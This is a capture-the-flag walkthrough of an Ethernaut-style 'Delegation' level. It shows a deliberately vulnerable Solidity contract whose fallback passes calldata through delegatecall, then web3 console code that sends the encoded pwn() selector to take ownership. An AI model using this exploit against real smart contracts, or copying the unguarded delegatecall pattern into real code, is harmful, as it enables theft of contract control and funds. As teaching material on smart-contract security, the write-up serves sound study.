The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

-   Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
-   Fallback methods
-   Method ids

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```


**SOLUTION:**


DelegateCall means that you take the implementation logic of the function in the contract you're making this call to, but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.

We type the following into the Developer Console, to solve the challenge:
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: payload
});
```

We verify that we solved the challenge by clicking the "Submit Instance" button, verifying the transaction, through Metamask, and waiting to be confirmed.